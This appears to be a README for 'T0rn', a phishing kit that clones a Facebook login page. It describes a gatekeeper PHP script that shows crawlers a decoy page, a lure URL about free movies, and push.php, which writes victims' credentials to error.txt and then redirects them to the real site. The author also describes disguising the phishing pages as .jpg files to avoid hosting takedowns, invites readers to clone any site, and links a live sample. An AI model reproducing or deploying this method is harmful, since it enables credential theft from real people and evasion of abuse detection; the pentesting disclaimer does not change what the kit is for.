T0rn is a Social Eng. template I had created like 2-3 years ago.. I have not been 
updating it a lot.

I've cloned a FB page, a Debian page and another random html page; The debian page acts as the
index file of the folder and the other two files I've saved them with .jpg extention to obfuscate crawlers
and also avoiding free web hosting accounts being locked..

So to trick a user, you have to craft a nice url that  Security_Check.php can understand,
(in this case I've created Download_latest_Series_and_Movies.php which you can rename)
e.g.  redirect the targeted user to a login page (in this case FB page) then dump the credentials 
in error.txt file using the push.php file then do a redirection to their legit FB account. 

Unwanted guest/crawlers/fuzzers will be redirect to the random html page and will never access the fake FB page.
So by hiding the FB pages with a .jpg extenstion instead of htm, we hide the phishing content in "plain sight" :)

I'm working on a python automation tool that can clone any-site and generate the same, 
but if you understand PHP go ahead and have some fun :)  

P.S. > you are not limited to Facebook only! Clone any website you want and be creative ;) wink!

Check a live hosted sample in the url below:

http://freemagicmovies.net84.net/Download_latest_Series_and_Movies.php?code=Transformers-4_age_of_extinction

NB: For Pentesting/Educational use only!
